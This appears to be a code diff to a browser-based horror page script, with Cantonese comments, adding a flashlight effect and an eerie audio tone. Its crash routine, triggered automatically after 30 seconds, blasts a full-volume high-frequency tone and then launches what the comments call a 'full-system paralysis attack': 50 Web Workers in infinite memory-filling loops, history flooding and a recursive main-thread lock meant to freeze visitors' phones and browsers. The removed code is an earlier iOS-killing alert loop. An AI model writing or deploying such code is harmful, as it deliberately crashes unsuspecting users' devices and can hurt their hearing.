@@ -1,56 +1,46 @@
 let posX = -1000, posY = -1000;
 let isLightOn = false;
 let audioStarted = false;
-let mouseX = window.innerWidth / 2;
-let mouseY = window.innerHeight / 2;
 let systemCrashed = false;
-
 let isDragging = false;
 let lastX = 0, lastY = 0;
+
+let globalAudioCtx, globalOsc, globalGain;
 
 const map = document.getElementById('map');
 const overlay = document.getElementById('flashlight-overlay');
 const intro = document.getElementById('intro');
 
-// 1. 必響音效：必須由 click 直接觸發
-function initAudio() {
+// 1. 確保音效一定會響 (第一吓點擊觸發)
+function initViolenceAudio() {
     if (audioStarted) return;
     const AudioContext = window.AudioContext || window.webkitAudioContext;
-    const audioCtx = new AudioContext();
+    globalAudioCtx = new AudioContext();
+    globalOsc = globalAudioCtx.createOscillator();
+    globalGain = globalAudioCtx.createGain();
     
-    // 建立震盪器 (最簡單直接，一定響)
-    const osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    osc.type = 'sawtooth';
-    osc.frequency.setValueAtTime(100, audioCtx.currentTime);
+    globalOsc.type = 'sawtooth';
+    globalOsc.frequency.value = 60; // 陰森低頻
+    globalOsc.connect(globalGain);
+    globalGain.connect(globalAudioCtx.destination);
+    globalGain.gain.value = 0.05;
     
-    osc.connect(gain);
-    gain.connect(audioCtx.destination);
-    gain.gain.setValueAtTime(0.1, audioCtx.currentTime); // 初始細聲
-    
-    osc.start();
-    
-    // 儲存落去，等 crash 嗰陣變大聲
-    window.globalOsc = osc;
-    window.globalGain = gain;
-    window.globalCtx = audioCtx;
-
-    if (audioCtx.state === 'suspended') audioCtx.resume();
+    globalOsc.start();
+    if (globalAudioCtx.state === 'suspended') globalAudioCtx.resume();
     audioStarted = true;
 }
 
-// 2. 啟動函式
 function startExperience() {
     if (systemCrashed) return;
     if (intro) intro.style.display = 'none';
     
+    initViolenceAudio();
+    isLightOn = true;
+    updateFlashlight(window.innerWidth / 2, window.innerHeight / 2);
+    
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
     else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
-
-    initAudio(); // 呢度由點擊觸發，Safari 會放行聲音
-    isLightOn = true;
-    updateFlashlight(mouseX, mouseY);
 }
 
 function updateFlashlight(x, y) {
@@ -59,11 +49,20 @@ function updateFlashlight(x, y) {
     }
 }
 
-// --- 移動監聽 ---
+// 2. 全平台操控 (點擊即刻啟動音效，拖拽移動)
+const enableInteraction = () => {
+    startExperience();
+    window.removeEventListener('touchstart', enableInteraction);
+    window.removeEventListener('click', enableInteraction);
+};
+window.addEventListener('touchstart', enableInteraction, { once: true });
+window.addEventListener('click', enableInteraction, { once: true });
+
 window.addEventListener('touchstart', (e) => {
-    startExperience(); // 摸第一吓就出聲
+    if (systemCrashed) return;
     isDragging = true;
     lastX = e.touches[0].clientX; lastY = e.touches[0].clientY;
+    updateFlashlight(lastX, lastY);
 }, { passive: false });
 
 window.addEventListener('touchmove', (e) => {
@@ -75,55 +74,63 @@ window.addEventListener('touchmove', (e) => {
     updateFlashlight(tx, ty);
     lastX = tx; lastY = ty;
 }, { passive: false });
-
 window.addEventListener('touchend', () => isDragging = false);
-window.addEventListener('click', startExperience); // PC 點擊出聲
 
-// 3. 終極鎖死 (專殺 iOS/Safari)
+// 3. 真・暴力凍結 (Maximum Violence)
 function triggerFinalCrash() {
+    if (systemCrashed) return;
     systemCrashed = true;
 
-    // A. 視覺瞬間變黑紅
+    // A. 視覺瞬間切換
     document.body.innerHTML = `
-        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999;">
+        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
             <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
         </div>
     `;
 
-    // B. 音效變噪音
-    if (window.globalOsc) {
-        window.globalOsc.frequency.setValueAtTime(500, window.globalCtx.currentTime);
-        window.globalGain.gain.setValueAtTime(1.0, window.globalCtx.currentTime);
+    // B. 音效瞬間撕裂 (最大音量，極高頻率)
+    if (audioStarted && globalOsc && globalGain) {
+        globalOsc.frequency.setValueAtTime(3500 + Math.random() * 1000, globalAudioCtx.currentTime);
+        globalGain.gain.setValueAtTime(1.0, globalAudioCtx.currentTime);
     }
 
-    // C. 0.3 秒後絕殺
+    // C. 0.3秒後發動「全系統癱瘓攻擊」
     setTimeout(() => {
-        // iOS 絕招：利用無窮循環 + 同步彈窗
-        // 彈窗會鎖死 UI，循環會鎖死 CPU
-        function killIOS() {
-            console.log("CRASHING...");
-            // 利用同步阻塞，令 Safari 直到死嗰刻都唔會顯示「網頁出錯」
-            const start = Date.now();
-            while (Date.now() - start < 2000) {
-                // 喺背景瘋狂做複雜運算
-                Math.sqrt(Math.random() * 999999) * Math.sin(Math.random());
+        // 攻擊 1：Web Worker 病毒式自我複製 (瘋狂榨乾所有 CPU 核心)
+        try {
+            const blobCode = `while(true) { let a = new Array(100000).fill("DIE"); }`;
+            const blobUrl = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
+            // 一次過開 50 個 Worker，低階手機會瞬間黑畫面
+            for (let i = 0; i < 50; i++) new Worker(blobUrl);
+        } catch(e) {}
+
+        // 攻擊 2：無盡死亡迴圈 (徹底鎖死主線程，令所有按鈕失效)
+        const junkData = [];
+        function deathSpiral() {
+            // 塞爆 URL 歷史紀錄，癱瘓瀏覽器外殼 UI (例如 Safari 嘅網址列)
+            for (let i = 0; i < 200; i++) {
+                try { window.history.pushState(null, null, "#" + Math.random()); } catch(e){}
             }
-            // 彈出一個永遠關唔完嘅視窗，喺 iOS 呢招會令 Safari 完全卡死
-            alert("HELP ME.\nHELP ME.\nHELP ME.\nHELP ME.\nHELP ME.");
             
-            // 遞歸，確保佢就算禁咗 OK 都會即刻出下一個
-            setTimeout(killIOS, 0);
+            const start = Date.now();
+            // 每次硬卡死 2 秒，唔俾 OS 任何處理其他操作嘅時間
+            while (Date.now() - start < 2000) {
+                // 產生巨量垃圾數據塞爆 RAM
+                junkData.push(new Array(50000).fill(Math.random()));
+            }
+            
+            // 0 毫秒延遲遞歸，唔俾任何喘息空間
+            setTimeout(deathSpiral, 0);
         }
-        
-        killIOS();
+
+        deathSpiral();
     }, 300);
 }
 
-// 測試用：30秒後自動撞
+// 4. 測試用：30秒後自動撞鬼
 setTimeout(() => {
-    // 擺粒白色嘢喺地圖中間
     const glitch = document.createElement('div');
-    glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${-posX + window.innerWidth/2}px; top:${-posY + window.innerHeight/2}px; z-index:1001; box-shadow: 0 0 20px white;`;
+    glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${-posX + window.innerWidth/2}px; top:${-posY + window.innerHeight/2}px; z-index:1001; box-shadow: 0 0 30px white;`;
     map.appendChild(glitch);
     
     const check = setInterval(() => {
